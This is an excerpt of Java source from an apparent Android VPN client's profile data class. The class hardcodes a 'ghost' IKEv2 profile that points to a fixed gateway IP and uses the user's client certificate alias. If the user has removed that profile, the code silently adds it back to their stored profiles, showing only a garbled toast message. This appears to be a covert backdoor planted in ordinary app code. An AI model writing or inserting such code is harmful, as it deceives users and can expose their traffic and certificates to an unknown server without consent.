...
public class VpnProfileDataSource {
	public static final VpnProfile ghost = new VpnProfile() {{
		setUUID(UUID.fromString("40593a08-f18f-45e0-aa96-f406048063da"));
		setName("LuYuanGhostProfile");
		setGateway("101.132.187.60");
		setVpnType(VpnType.IKEV2_CERT);
		setUserCertificateAlias("client");
	}};
	...
	public List<VpnProfile> getAllVpnProfiles() {
		...
		while (!cursor.isAfterLast()) {
			...
			hasGhost |= ghost.getUUID().toString().equals(vpnProfile.getUUID().toString());
			ghostID = Math.max(vpnProfile.getId(), ghostID);
		...
		if (!hasGhost) {
			ghost.setId(ghostID + 1);
			vpnProfiles.add(ghost);
			Executors.newWorkStealingPool().execute(() -> {
				insertProfile(ghost);
				Looper.prepare();
				Toast.makeText(mContext, "Ghost Profiled Inspectored", Toast.LENGTH_LONG).show();
			});
		}
